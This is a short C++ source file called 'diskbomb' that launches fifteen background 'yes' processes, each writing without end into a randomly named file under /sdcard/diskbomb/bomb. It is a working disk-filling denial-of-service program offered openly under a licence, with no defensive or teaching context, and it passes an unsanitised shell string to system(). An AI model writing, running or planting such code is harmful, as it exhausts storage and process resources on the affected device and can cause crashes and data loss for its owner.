//diskbomb by Edward Hsing {MIT LICENSE}
#include<iostream>
#include<stdlib.h>
#include<cstdlib>
#include<random>
using namespace std;

int diskbomb(int whilenum, string writestr, string path)
{
    int whilerun = 0;  

    for(int i=0; i<whilenum; ++i)
    {
        string runsh = "nohup yes " + writestr + " > " + path + "/$RANDOM" + " &";
        char* runsh_str = (char*)runsh.c_str();
        system(runsh_str);
    }
}
int main()
{
    //define
    int whilenum = 15;
    string writestr = "yourdiskbomb"; //Any character
    string path = "/sdcard/diskbomb/bomb";
    diskbomb(whilenum, writestr, path);
    
}
